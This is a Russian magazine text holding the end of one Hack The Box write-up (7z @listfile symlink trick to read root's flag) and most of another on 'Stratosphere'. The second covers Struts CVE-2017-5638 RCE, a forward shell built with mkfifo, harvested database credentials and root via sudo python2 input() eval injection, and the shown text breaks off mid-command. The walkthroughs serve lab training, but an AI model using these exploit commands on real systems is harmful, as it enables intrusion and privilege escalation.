Далее, посмотрев исходники page.php, я обна ружил пароль юзера ldapuser
в хардкоде.





            Пароль поль зователя ldapuser в коде page.php

А это значит, что в нашем распоряжении теперь еще одна сес сия — от имени
пользователя ldapuser.


SSH — ПОРТ 22
Коннектимся к машине по SSH, потому что так будет приятнее осматриваться
внутри, и практически сразу замеча ем нестандартную директорию /backup
в корне файловой системы.





           Директория /backup в корне файловой системы

Внутри находим тучу архивов с бэкапами, лог ошибок и инте ресный скрипт
honeypot.sh.





                Содержимое директории /backup

Важное наблюдение, которое нам еще пригодится: архивы с бэкапами соз‐
даются каждую минуту.
  На этом этапе, кстати, мы уже можем чес тно заб рать первый флаг.





  [ldapuser@ctf ~]$ cat user.txt


  74a8e86f????????????????????????




honeypot.sh
# honeypot.sh


# get banned ips from fail2ban jails and update banned.txt
# banned ips directily via firewalld permanet rules are **not**
included in the list (they get kicked for only 10 seconds)
/usr/sbin/ipset list | grep fail2ban ‐A 7 | grep ‐E '[0‐9]{1,3}\.[
0‐9]{1,3}\.[0‐9]{1,3}\.[0‐9]{1,3}' | sort ‐u > /var/www/html/banned.
txt
# awk '$1=$1' ORS='<br>' /var/www/html/banned.txt > /var/www/html/
testfile.tmp && mv /var/www/html/testfile.tmp /var/www/html/banned.
txt


# some vars in order to be sure that backups are protected
now=$(date +"%s")
filename="backup.$now"
pass=$(openssl passwd ‐1 ‐salt 0xEA31 ‐in /root/root.txt | md5sum |
awk '{print $1}')


# keep only last 10 backups
cd /backup
ls ‐1t *.zip | tail ‐n +11 | xargs rm ‐f


# get the files from the honeypot and backup 'em all
cd /var/www/html/uploads
7za a /backup/$filename.zip ‐t7z ‐snl ‐p$pass ‐‐ *


# cleaup the honeypot
rm ‐rf ‐‐ *


# comment the next line to get errors for debugging
truncate ‐s 0 /backup/error.log

Здесь все достаточно просто. В пер вой значащей строке скрипт обновляет
информацию о забаненных после попыток брутфорса IP‐адресах, а далее
создает одиннадцать архивов .7z, запаролен ных с помощью флага супер‐
пользователя. Нас будет интересовать 19‐я строка, а именно сама команда
архивирования бэкапов.


7za a /backup/$filename.zip ‐t7z ‐snl ‐p$pass ‐‐ *

Здесь с помощью опции ‐t7z задается формат будущих архивов, опция ‐snl
говорит утилите, чтобы та не резолвила символические ссылки и оставляла их
ссылками при добавлении файлов в архив, ‐p$pass устанавливает пароль
шифрования, а вот то, что идет дальше, поз воляет нам прочитать любой файл
от имени root...
  Дело тут вот в чем. Последовательность ‐‐ * используется для того, что‐
бы передать скрипту список всех имен файлов, находящихся в текущей
рабочей директории  (в нашем случае это /var/www/html/uploads, так
как именно туда мы переходим одной командой рань ше). Однако у 7z есть па‐
раметр @listfiles, который поз воля ет указать список файлов для добав‐
ления в архив.
   Как это работает на примере: если я выполню команду вида 7za a test.
zip @files.lst, где ﬁles.lst — это текстовый файл, содержащий спи сок фай‐
лов, которые нужно запаковать, то 7z пос лушно создаст архив test.zip, содер‐
жащий все файлы из построчного списка ﬁles.lst. Удобно, не правда ли?
  А теперь представим ситу ацию, в которой я создаю в директории /var/
www/html/uploads два файла: @F4CK7z и F4CK7z. Первый я оставлю пустым,
а второй сделаю символической ссылкой на файл, который бы я хотел про‐
читать от име ни суперпользователя. Ска жем, это будет финальный флаг
/root/root.txt. При таком раскладе 7z, не подозревая западни, заберет
оба этих файла для «архивирования» и выполнит команду такого вида:


7za a /backup/$filename.zip ‐t7z ‐snl ‐p$pass @F4CK7z F4CK7z

Из‐за того что указана опция @F4CK7z, 7z попытается прочитать содержимое
файла F4CK7z, который лежит в этой же директории и представляет собой
ссылку на /root/root.txt, а так как скрипт honeypod.sh выполняется
от имени root, то у 7z получится открыть любой файл. Гру бо говоря, команда
выше превратится в нечто подоб ное:


7za a /backup/$filename.zip ‐t7z ‐snl ‐p$pass <
флаг_суперпользователя> F4CK7z

Не найдя файла с именем флаг_суперпользователя, который, как кажет‐
ся 7z, нужно положить в архив, архиватор вежливо сообщит о случившейся
ошибке в логе error.log, который мы можем читать.


Эксплу атация 7z
Так как доступ к директории /var/www/html/uploads есть у пользователя
apache, но его нет у ldapuser (из‐под которо го мы сидим в SSH), то нам при‐
годится тот неудобный шелл, который мы получи ли в предыдущем разделе.



  [ldapuser@ctf backup]$ ls ‐ld /var/www//html/uploads
  drwxr‐x‐‐x. 2 apache apache 6 Aug 16 16:12 /var/www//html/uploads


Мы уже выяснили ранее, что скрипт honeypot.sh отрабаты вает каждую
минуту. Так как, скорее всего, задача выполняется по планировщику cron, то
отсчет ведется с началом каждой новой минуты, поэтому нам нужно создать
два требуемых для эксплуатации файла, уложившись в окно с :00 по :59.
Проверим время и создадим нужные фай лы.





           Создание файлов для экс плуата ции архиватора 7z

Я закончил создание файлов в 16:11:47, уложившись в окно с 16:11:00
по 16:11:59. Через 13 секунд пос ле  этого, следя за логом ошибок
с помощью tail ‐f из SSH‐сессии, я получил свое сокровище.





                                           root.txt

На этом машину считаю пройденной.





                             Трофей


ЭПИЛОГ
Оригинальные LDAP-запросы
Получив доступ  к файловой системе, я смог пос мотреть, как выглядят
исходные LDAP‐запросы, о структуре которых мы выдвигали столько пред‐
положений. Первый запрос из исходников login.php.


$filter = "(&(&(objectClass=inetOrgPerson)(uid=$username2))(pager=*))
";


// Или более наглядно


(&
    (&
        (objectClass=inetOrgPerson)
        (uid=$username2)
    )
    (pager=*)
)

Второй — из исходников page.php. Именно переменная username2, подкон‐
трольная пользователю веб‐ресурса, дала нам возможность провес ти LDAP‐
инъекцию второго порядка.


$filter = "(&(&(objectClass=inetOrgPerson)(uid=$username2)(|(gidNum
ber=4)(gidNumber=0)))(pager=*))";


// Или более наглядно


(&
    (&
        (objectClass=inetOrgPerson)
        (uid=$username2)
        (|
            (gidNumber=4)
            (gidNumber=0)
        )
    )
    (pager=*)
)


Об щаемся с сервером через FwdSh3ll
FwdSh3ll — мини‐фреймворк для генера ции и спауна форвард‐шел лов,
использующий веб‐уязвимости. В коммента риях к пре дыду щему прохож‐
дению заметили, что «фреймворк давно мертв». Отчасти согласен, однако
ничто не мешает ему оставать ся отличным при мером того, как следовало бы
взаимодействовать с сервером, если бы исходящий трафик жестко фильтро‐
вал ся и нам бы не удалось получить реверс‐шелл стандартным способом.
  Я создал отдельную ветку FwdSh3ll для демонстрации управле ния этой
машиной: из‐за того что здесь нет уяз вимос ти как таковой (у нас просто есть
«легальная» форма для ввода команд), понадобились небольшие изменения
в коде. И хотя в данном случае я не использую концепцию Forward Shell в чис‐
том виде (в этом просто нет необ ходимос ти), этот фреймворк позволил мне
с комфортом иссле довать вир туалку из терминала — в точности как если бы я
получил каноничный шелл.





      Демка использования FwdSh3ll для вза имодей ствия с ВМ CTF
ВЗЛОМ
  ПОЛЕТ
     В СТРАТОСФЕРУ

                   ЛОМАЕМ STRUTS
                        ЧЕРЕЗ ACTION‐
                     ПРИЛОЖЕНИЕ
                     И МАСТЕРИМ
                    FORWARD SHELL





      snovvcrash
 Безопасник, временами
   питонщик, местами
криптоана(рхист)литик, по
необходимости системный
     администратор.
 snovvcrash@protonmail.ch




В этой статье я покажу, как захватить стратосферу, а точ‐
нее — получить рут на виртуалке Stratosphere с CTF‐площад‐
ки Hack The Box. На этот раз мы повоюем с фреймворком
Apache Struts для получения RCE‐уязвимости в веб‐при‐
ложении,  рас смотрим  в действии редко обсуждаемую,
но очень полезную концепцию получения удаленной сессии
Forward Shell, а также поиграем с уго ном библиотеки и экс‐
плуатацией функции eval() для скрип та на Python.





                     HTB — Stratosphere

Несмотря на то что Stratosphere не слишком сложна (5,2 бал ла из 10), про‐
хождение этой ВМ дос тавило мне немало удовольствия благодаря воз‐
можности попрактиковаться с редко встречаемой техникой Forward Shell.
  Помимо этого, вот с чем мы столкнемся на пути к флагу суперпользовате‐
ля:
 • разведка и сбор информа ции об используемом ПО для обнаружения
  фреймворка Apache Struts;
 • выявление слабых мест Struts для атаки на веб‐приложение, построенное
   на Java EE и Action;
 • поиск удобного способа взаимодействия с хостом в условиях беспощадно
   фильтруемого исходящего тра фика HTTP;
 • обнаружение слабого пароля для базы данных MySQL и извле чение из нее
   авторизационных  данных  пользователя  для  подключения  к машине
   по SSH;
 • два способа эксплуатации уязвимого приложения на Python: абъюз фун‐
   кции eval() и «угон» импортируемо го модуля.


РАЗВЕДКА
Приступим, пожалуй. Сначала заглядываем в откры тые порты с помощью
героя всех фильмов про хакеров — ска нера Nmap.



  root@kali:~# nmap ‐n ‐Pn ‐sV ‐sC ‐oA nmap/stratosphere 10.10.10.64
  root@kali:~# cat nmap/stratosphere.nmap
  # Nmap 7.70 scan initiated Sat Aug 10 23:56:34 2019 as: nmap ‐n ‐v ‐Pn ‐
  sV ‐sC ‐oA nmap/initial 10.10.10.64
  Nmap scan report for 10.10.10.64
  Host is up (0.054s latency).
  Not shown: 997 filtered ports
  PORT     STATE SERVICE    VERSION
  22/tcp   open  ssh        OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)
  | ssh‐hostkey:
  |   2048 5b:16:37:d4:3c:18:04:15:c4:02:01:0d:db:07:ac:2d (RSA)
  |   256 e3:77:7b:2c:23:b0:8d:df:38:35:6c:40:ab:f6:81:50 (ECDSA)
  |_  256 d7:6b:66:9c:19:fc:aa:66:6c:18:7a:cc:b5:87:0e:40 (ED25519)
  80/tcp   open  http
  | fingerprint‐strings:
  | [ ....................................................... ]
  | [ ............ [содержимое строки‐отпечатка] ............ ]
  | [ ....................................................... ]
  |   GetRequest:
  | [ ....................................................... ]
  | [ ................ [ответ на GET‐запрос] ................ ]
  | [ ....................................................... ]
  | http‐methods:
  |   Supported Methods: GET HEAD POST PUT DELETE OPTIONS
  |_  Potentially risky methods: PUT DELETE
  |_http‐title: Stratosphere
  8080/tcp open  http‐proxy
  | fingerprint‐strings:
  | [ ....................................................... ]
  | [ ............ [содержимое строки‐отпечатка] ............ ]
  | [ ....................................................... ]
  |   GetRequest:
  | [ ....................................................... ]
  | [ ................ [ответ на GET‐запрос] ................ ]
  | [ ....................................................... ]
  | http‐methods:
  |   Supported Methods: GET HEAD POST PUT DELETE OPTIONS
  |_  Potentially risky methods: PUT DELETE
  |_http‐open‐proxy: Proxy might be redirecting requests
  |_http‐title: Stratosphere
  2 services unrecognized despite returning data. If you know the service/
  version, please submit the following fingerprints at https://nmap.org/
  cgi‐bin/submit.cgi?new‐service :
  ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)
  ==============
  | [ ....................................................... ]
  | [ .... [отпечаток неопознанного сервиса на порте 80] .... ]
  | [ ....................................................... ]
  ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)
  ==============
  | [ ....................................................... ]
  | [ ... [отпечаток неопознанного сервиса на порте 8080] ... ]
  | [ ....................................................... ]
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


  Read data files from: /usr/bin/../share/nmap
  Service detection performed. Please report any incorrect results at
  https://nmap.org/submit/ .
  # Nmap done at Sat Aug 10 23:56:59 2019 ‐‐ 1 IP address (1 host up)
  scanned in 24.41 seconds


В этот раз Nmap разразился мощнейшим потоком информации, большую
часть из которой я не стал вклю чать в листинг, потому что она бес полезна
для наших нужд: в основном это были строки — отпечатки неопознанных сер‐
висов, которые сканер не смог идентифицировать и попросил сделать это за
него. Также я не стал приводить содержимое ответов на GET‐запросы,
которые Nmap решил отпра вить на веб — 80‐й и 8080‐й порты.
  В остальном име ем клас сическую (пока) схему.
 • Secure Shell на 22‐м пор те, который так и не научился «не палить» версию
  ОС — с ходу мы видим, что имеем дело с виртуал кой, на которой раз‐
   вернут дистрибутив Debian версии 9 (Stretch), о чем свидетельствует
   ревизия deb‐пакета в баннере OpenSSH.
 • Неопознанные веб‐сервер на 80‐м порте и прокси на 8080‐м.

С веба и начнем.


ВЕБ — ПОРТ 80
Посмотрим, нет ли в веб‐сервере уяз вимостей, пригодных для исполь‐
зования в качестве вход ной точки в машину.


Браузер
На  http://10.10.10.64  тебя  встретит  цветастый  градиент  сайта
Stratosphere.





                     Главная стра ница Stratosphere

При переходе по ссылке GET STARTED NOW сервер выплюнет страницу
с таким наполнением.


<!‐‐ view‐source:http://10.10.10.64/GettingStarted.html ‐‐>


<!DOCTYPE html>
<html>
<head>
    <meta charset="utf‐8"/>
    <title>Stratosphere ‐‐ Getting Started</title>
</head>
<body>
    <h1>Site under construction. Please check back later.</h1>
</body>
</html>

Говорят, что сайт пока только раз рабатывает ся, поэтому пусто. Придержива‐
ясь классической разведывательной тактики, следующим шагом сканируем
серверы на словарные директории.


gobuster
Из всех инструментов для поиска дефолтных директорий мне больше других
нравится gobuster. Этот мно гопо точный брутфорсер написан на Go, что поз‐
воляет без лишних усилий закинуть бинарник в сис тему и сразу же запустить
его. Gobuster поддерживает ся соз дателем в акту аль ном состоянии, серьезно
обновляется с выходом новых версий, и, что немаловажно, он действительно
быстрый.
   Указав нужный хост через опцию ‐u и словарь для перебора имен дирек‐
торий (один из стандартных для Kali) через ‐w, запустим перебор в рас‐
ширенном режиме (опция ‐e позволя ет выводить найденные URL‐адреса
в полном виде), сох раняя при этом вывод утилиты во внешний файл через ‐o
для отчетности.



  root@kali:~# gobuster dir ‐u 'http://10.10.10.64' ‐w /usr/share/dir‐
  buster/wordlists/directory‐list‐2.3‐medium.txt ‐e ‐o gobuster/stratos‐
  phere.gobuster
  ===============================================================
  Gobuster v3.0.1
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
  ===============================================================
  [+] Url:            http://10.10.10.64
  [+] Threads:        10
  [+] Wordlist:       /usr/share/dirbuster/wordlists/directory‐list‐2.3‐
  medium.txt
  [+] Status codes:   200,204,301,302,307,401,403
  [+] User Agent:     gobuster/3.0.1
  [+] Expanded:       true
  [+] Timeout:        10s
  ===============================================================
  2019/08/11 00:44:24 Starting gobuster
  ===============================================================
  http://10.10.10.64/manager (Status: 302)
  http://10.10.10.64/Monitoring (Status: 302)
  Progress: 13738 / 220561 (6.23%)^C
  [!] Keyboard interrupt detected, terminating.
  ===============================================================
  2019/08/11 00:45:39 Finished
  ===============================================================


Обнаружив два любопытных адреса, я оста новил перебор (больше ничего
не найдется, поверь на сло во) и пошел проверять то, что предложил мне
gobuster.


        WWW

                     Другие известные инструмен ты для брута дирек‐
                        торий:
                          •dirb — минималистичный брутер, написанный
                         на  С.  Не  отличается  высокой  скоростью
                         работы;
                           •dirbuster — популярный когда‐то брутер с гра‐
                       фическим  интерфейсом.  Сейчас  в OWASP
                         прекратили развитие это го проекта.



/manager
Перейдя по адресу http://10.10.10.64/manager, видим стандартный сер‐
вер‐менеджер Apache Tomcat. Доступа к нему у нас, конечно же, нет.





                Сер вер‐менеджер Apache Tomcat


/Monitoring
На http://10.10.10.64/Monitoring — кое‐что гораздо интерес нее.





                      Action‐приложение Apache Struts

От кнопок SIGN ON и REGISTER толку мало — обе они ведут к сообщению
о том, что сайт все еще на ста дии раз работки.





                     «Сайт еще разрабаты вается»


APACHE STRUTS
Главная зацепка — это Action‐приложение, представленное на веб‐странице
скриншотом ранее, которое час то свя зано с фреймворком Struts.
   Struts предназначен для создания веб‐при ложений, базирующихся на тех‐
нологии Java EE — наборе правил и спецификаций для Java, который опи‐
сывает архитектуру серверной платформы для пос троения приложений.
  Простыми словами, Struts — это реализация концепции «модель — пред‐
ставление — контрол лер» (Model — View — Controller, MVC), созданная
в Apache Software Foundation. Action здесь представляет собой запрос кли‐
ента, обрабатываемый контроллером (сервлетом ActionServlet) на сервере.
Круговорот трафика в мире Apache Struts изображен на картинке ниже.





  Взаимодействие «клиент — сервер» для Apache Struts (источник —
  NetBeans)

«Это, конечно, здорово, но что все это может дать для нашей задачи проник‐
новения в систему?» — вопросишь ты. Не так давно в механизме взаимодей‐
ствия, описанном выше, была обна ружена уяз вимость, позволяющая выпол‐
нить произвольный код на уда ленном хосте, рейтинг опасности которой был
оценен в максимальные 10.0 по нотации CVSSv2.


        WWW

                   В «Хакере» публиковался разбор упомянутой уяз‐
                      вимости с видео, а также анализ двух более
                      новых проблем со Struts 2: дыры в модуле, отве‐
                   чающем за REST API, и ошибки, позволяющей
                       внед рять свой namespace с помощью манипу‐
                      ляций запросами HTTP (CVE‐2018‐11776).


Это, конечно, не HeartBleed с его 11/10, но все равно совсем не плохо. Пос‐
мотрим, что на этот счет скажет searchsploit. Так как после раскрытия уяз‐
вимости прошло два года, готов поспорить, что на просторах exploit‐db есть
красивый эксплоит.





               Ищем PoC с помощью searchsploit

Похоже, exploits/linux/webapps/41570.py — именно то, что нам нужно.
Этот скрипт на Python представляет собой PoC, который демонстрирует
выпол нение  уязвимости CVE‐2017‐5638. Из‐за некорректной обработки
исключений при процессинге специально сформированного evil‐значения
для заголовка Content‐Type нарушителю даруется RCE. Попробуем эксплоит
в действии.



  root@kali:~# searchsploit ‐m exploits/multiple/webapps/42324.py
  root@kali:~# python 42324.py http://10.10.10.64/Monitoring/example/Wel‐
  come.action id
  [*] CVE: 2017‐5638 ‐ Apache Struts2 S2‐045
  [*] cmd: id


  uid=115(tomcat8) gid=119(tomcat8) groups=119(tomcat8)


Итак, у нас есть способ уда ленного выполнения команд на сервере. Забегая
вперед, должен сказать, что повысить привилегии до пользователя в этой
виртуалке можно, просто выполняя команды таким способом, без пол ноцен‐
ного реверс‐шелла (как мы делали, когда захватыва ли Mischief, к при меру),
который, как выяснилось, невозможно получить из‐за жесткой фильтрации
исходящего трафика HTTP. Однако мы не ищем легких путей, к тому же
это отличная возможность попробовать в действии один из способов получе‐
ния удаленной сессии на уязвимом хосте — Forward Shell.


Forward Shell
Основная идея такого способа получения командной строки заключается
в создании на машине жертвы именованного канала (назовем его stdin)
с помощью mkfifo и выходного фай ла (назовем его stdout), куда будет
записываться вывод команд. После чего к stdin с помощью утилиты tail
привязывается  процесс  /bin/sh,  вывод  которого  перенаправляется
в stdout. Флаг ‐f утилиты tail обеспечива ет сохранение процесса выпол‐
нения команд даже при дос тижении конца фай ла входного канала (когда
команды не поступают).
   Для более наглядного представления про демонстрирую то, что я собира‐
юсь сделать на локальной машине.





            Име нованные каналы на локальной машине

 1. В верхней панели я соз даю именованный пайп stdin, при вязываю его
   вход к шеллу /bin/sh , а выход перенаправляю в файл stdout.
 2. В нижней панели записываю команды в stdin и читаю результат выпол‐
   нения из stdout, очищая после каждого прочтения выходной файл (чтобы
   получать вывод только пос ледней инструкции).

Из интересных фишек, которые хочется прокомментировать: такая схема вза‐
имодействия  с  тер минальной  сессией  позволя ет запоминать  текущую
рабочую директорию и выполнять команды от имени других процессов PTY (я
продемонстрировал пример с Python).
  В конечном итоге эта концепция обрела свое мес то в крошечном
самопальном наступательном фреймворке FwdSh3ll, который делает пример‐
но то же самое, что я показал, но автоматизированно и на удаленной машине,
оборачивая зап рошенные пользователем команды в Base64 для передачи
по сети. Плюс в фоне поднимается парал лельный поток, который опрашивает
stdout с каким‐то интерва лом и воз вра щает его содержимое — результат
выпол нения последней команды.
   Хотел бы сказать, что положу фреймворк на диск, идущий в комплекте
с журналом, но «Новое время — новые веяния»… В общем, можешь перейти
по ссылке и скачать его самостоятельно.


        WWW

                     Запись терминальной сессии работы фреймворка
                        FwdSh3ll на примере виртуалки Stratosphere


В чем принципиальные отличия от широко известных схем Reverse Shell
и Bind Shell? В том, что атакуемый хост никуда не отправляет вывод выпол‐
ненных инструкций. Для него все происхо дит прозрачно: если все выполняет‐
ся локально (и выполнение команды, и чтение результата), тогда незачем
бить тревогу и жаловаться всяким iptables. Но, конечно, для успешной реали‐
зации этого необходимо под рукой иметь спо соб выполнения кода на удален‐
ной машине, на чем все, собственно, и держится.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
             ПОЛЕТ
     В СТРАТОСФЕРУ
                 ЛОМАЕМ STRUTS ЧЕРЕЗ ACTION‐
         ПРИЛОЖЕНИЕ И МАСТЕРИМ FORWARD SHELL





Осматриваемся на хосте
Так или иначе, получив воз можность выполнять команды на машине‐жертве,
осмотримся, где мы оказались. Для начала узна ем, кто мы и когда было ском‐
пилировано ядро.



  stratosphere> whoami
  tomcat8


  stratosphere> id
  uid=115(tomcat8) gid=119(tomcat8) groups=119(tomcat8)


  stratosphere> uname ‐a
  Linux stratosphere 4.9.0‐6‐amd64 #1 SMP Debian 4.9.82‐1+deb9u2 (2018‐02‐
  21) x86_64 GNU/Linux


Как и ожидалось, команды выполняются от имени tomcat8 — пользовате ля
с низкими привилегиями, который кру тит веб‐сервер.
  Ядро версии 4.9.0‐6, поэто му эскалация при вилегий при помощи DirtyCow
не вариант. Посмотрим на файловую систему.



  stratosphere> ls ‐la
  total 24
  drwxr‐xr‐x  5 root    root    4096 Aug 11 08:15 .
  drwxr‐xr‐x 42 root    root    4096 Oct  3  2017 ..
  lrwxrwxrwx  1 root    root      12 Sep  3  2017 conf ‐> /etc/tomcat8
  ‐rw‐r‐‐r‐‐  1 root    root      68 Oct  2  2017 db_connect
  drwxr‐xr‐x  2 tomcat8 tomcat8 4096 Sep  3  2017 lib
  lrwxrwxrwx  1 root    root      17 Sep  3  2017 logs ‐> ../../log/tom‐
  cat8
  drwxr‐xr‐x  2 root    root    4096 Aug 11 08:15 policy
  drwxrwxr‐x  4 tomcat8 tomcat8 4096 Feb 10  2018 webapps
  lrwxrwxrwx  1 root    root      19 Sep  3  2017 work ‐> ../../cache/tom‐
  cat8


  stratosphere> file *
  conf:       symbolic link to /etc/tomcat8
  db_connect: ASCII text
  lib:        directory
  logs:       symbolic link to ../../log/tomcat8
  policy:     directory
  webapps:    directory
  work:       symbolic link to ../../cache/tomcat8


Далеко не отходя, нашли текстовый файл db_connect с авторизационными
данными для подклю чения к базе данных. Похоже, что это наша следующая
контрольная точка.



  stratosphere> cat db_connect
  [ssn]
  user=ssn_admin
  pass=AWs64@on*&


  [users]
  user=admin
  pass=admin



PrivEsc: tomcat8 → richard
Взглянем, что хранит база данных MySQL. Сразу скажу, что первый набор
кредов ssn_admin:AWs64@on*& — это «кроличья нора» для отвлечения вни‐
мания, под этой учеткой в базе данных пус то. Поэтому будем использовать
второй набор.



  stratosphere> mysql ‐u admin ‐p"admin"
  Welcome to the MariaDB monitor.  Commands end with ; or \g.
  Your MariaDB connection id is 8
  Server version: 10.1.26‐MariaDB‐0+deb9u1 Debian 9.1


  Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others.


  Type 'help;' or '\h' for help. Type '\c' to clear the current input
  statement.


Подключившись от имени админа, запросим таб лицы.



  MariaDB [(none)]> show databases;
  +‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐+
  | Database           |
  +‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐+
  | information_schema |
  | users              |
  +‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐+
  2 rows in set (0.00 sec)


  MariaDB [(none)]> use users;
  Reading table information for completion of table and column names
  You can turn off this feature to get a quicker startup with ‐A


  Database changed
  MariaDB [users]> show tables;
  +‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐+
  | Tables_in_users |
  +‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐+
  | accounts        |
  +‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐+
  1 row in set (0.00 sec)


  MariaDB [users]> select * from accounts;
  +‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐+‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐+‐‐‐‐‐‐‐‐‐‐+
  | fullName         | password                  | username |
  +‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐+‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐+‐‐‐‐‐‐‐‐‐‐+
  | Richard F. Smith | 9tc*rhKuG5TyXvUJOrE^5CK7k | richard  |
  +‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐+‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐+‐‐‐‐‐‐‐‐‐‐+
  1 row in set (0.00 sec)


В базе users нашли табличку accounts с дра гоценным содержимым. Выд‐
вину уникальное предположение, что это авторизационные данные поль‐
зователя richard (и не про гадаю!).


SSH — ПОРТ 22
Подключимся к машине по SSH. Для удобства переда ем пароль как аргумент
командной строки с помощью sshpass и пропус каем проверку сертификата —
учебная все же машина.





                        Внутри машины по SSH


user.txt
Заберем флаг поль зователя.



  richard@stratosphere:~$ cat /home/richard/user.txt
  e610b298????????????????????????


И сразу же посмотрим на уже привлекший наше вни мание скрипт test.py.


#!/usr/bin/python3
import hashlib


def question():
    q1 = input("Solve: 5af003e100c80923ec04d65933d382cb\n")
    md5 = hashlib.md5()
    md5.update(q1.encode())
    if not md5.hexdigest() == "5af003e100c80923ec04d65933d382cb":
        print("Sorry, that's not right")
        return
    print("You got it!")
    q2 = input("Now what's this one? d24f6fb449855ff42344feff
18ee2819033529ff\n")
    sha1 = hashlib.sha1()
    sha1.update(q2.encode())
    if not sha1.hexdigest() == 'd24f6fb449855ff42344feff18ee28190
33529ff':
        print("Nope, that one didn't work...")
        return
    print("WOW, you're really good at this!")
    q3 = input("How about this? 91ae5fc9ecbca9d346225063f23d2bd9\n")
    md4 = hashlib.new('md4')
    md4.update(q3.encode())
    if not md4.hexdigest() == '91ae5fc9ecbca9d346225063f23d2bd9':
        print("Yeah, I don't think that's right.")
        return
    print("OK, OK! I get it. You know how to crack hashes...")
    q4 = input("Last one, I promise: 9efebee84ba0c5e030147cfd
1660f5f2850883615d444ceecf50896aae083 ead798d13584f52df0179df0
200a3e1a122aa738beff263b49d2443738eba41c943\n")
    blake = hashlib.new('BLAKE2b512')
    blake.update(q4.encode())
    if not blake.hexdigest() == '9efebee84ba0c5e030147cfd1660f5f28
50883615d444ceecf50896aae083 ead798d13584f52df0179df0200a3e1a1
22aa738beff263b49d2443738eba41c943':
        print("You were so close! urg... sorry rules are rules.")
        return


    import os
    os.system('/root/success.py')
    return


question()

Нас просят разреверсить нес колько хешей, обещая при этом манну небес‐
ную в виде выполнения файла /root/success.py. Чувствуя здесь под вох, я
начал искать иной способ эксплуата ции скрипта.


PrivEsc: richard → root. Спо соб 1
Первое, что бросается в глаза, — шебанг привязан к python3. К тому же,
если сорвать пок ровы с символической ссылки, указывающей на стандартный
интерпретатор, видно, что команда python тоже указывает на бинарник
третьей версии.



  richard@stratosphere:~$ ls ‐l /usr/bin/python
  lrwxrwxrwx 1 root root 16 Feb 11  2018 /usr/bin/python ‐> /usr/bin/
  python3


Уже второй раз нам активно внушают идею запустить скрипт именно
с помощью этой вер сии Python. Не совсем обычно, не правда ли? Памятуя
о том, кто владелец файла, пос мотрим на вывод sudo ‐l.



  richard@stratosphere:~$ sudo ‐l
  Matching Defaults entries for richard on stratosphere:
  env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/
  usr/sbin\:/usr/bin\:/sbin\:/bin


  User richard may run the following commands on stratosphere:
  (ALL) NOPASSWD: /usr/bin/python* /home/richard/test.py


Оказывается, что все пользователи могут выполнять test.py с помощью
/usr/bin/python* с повышен ными привилегиями. Все бы ничего, вот только
значок «звездочка» полностью развязыва ет руки всем недоброжелателям,
которые добрались до это го этапа. Известно, что в Python 2 функция input()
эквивалентна конструкции вида eval(raw_input()). Поэтому запуск test.py
с помощью /usr/bin/python2 через sudo поз волит пользователю выполнять
команды от имени root, чем мы, собственно, и зай мемся.
  Смотрим, какие «питоны» дос тупны в системе.



  richard@stratosphere:~$ ls ‐l /usr/bin/python*
  lrwxrwxrwx 1 root root      16 Feb 11  2018 /usr/bin/python ‐> /usr/bin/
  python3
  lrwxrwxrwx 1 root root       9 Jan 24  2017 /usr/bin/python2 ‐> python2.
  7
  ‐rwxr‐xr‐x 1 root root 3779512 Nov 24  2017 /usr/bin/python2.7
  lrwxrwxrwx 1 root root       9 Jan 20  2017 /usr/bin/python3 ‐> python3.
  5
  ‐rwxr‐xr‐x 2 root root 4747120 Jan 19  2017 /usr/bin/python3.5
  ‐rwxr‐xr‐x 2 root root 4747120 Jan 19  2017 /usr/bin/python3.5m
  lrwxrwxrwx 1 root root      10 Jan 20  2017 /usr/bin/python3m ‐>
  python3.5m


А теперь просто вызовем /home/richard/test.py с помощью  Python
2 и подадим фун кции eval() (которая, по сути, и будет принимать наш ввод)
/bin/bash для получения сес сии суперпользователя. Для этого я сперва
импортирую модуль os с помощью гло бальной функции импорта __im‐
port__(), а затем вызову функцию system() через оператор «точка». Этот
трюк пройдет, потому что функция импорта как раз вернет ссылку на объ ект
указанного модуля os.



  richard@stratosphere:~$ sudo /usr/bin/python2 ~/test.py
  Solve: 5af003e100c80923ec04d65933d382cb
  __import__('os').system('/bin/bash')


  root@stratosphere:/home/richard# whoami
  root


  root@stratosphere:/home/richard# id
  uid=0(root) gid=0(root) groups=0(root)



root.txt


  root@stratosphere:/home/richard# cat /root/root.txt
  d41d8cd9????????????????????????


Кстати, уже сейчас можно разоблачить негодя ев, удостоверившись в том, что
обещанного /root/success.py не существу ет:



  root@stratosphere:/home/richard# ls /root/success.py
  ls: cannot access '/root/success.py': No such file or directory


Но в эпилоге мы все же сломаем пару хешей. Так, разминки ради.


PrivEsc: richard → root. Спо соб 2
В начале исходника нельзя не  заметить импорт библиотеки hashlib
для вычисления хеш‐зна чений вводимых строк. Угоним эту библиоте ку?
Для этого нам необходимо узнать порядок резолва путей, по которым будут
импортироваться модули. Сделать это можно пря мо из Python.



  richard@stratosphere:~$ python ‐c 'import sys; print(sys.path)'
  ['', '/usr/lib/python35.zip', '/usr/lib/python3.5', '/usr/lib/python3.5/
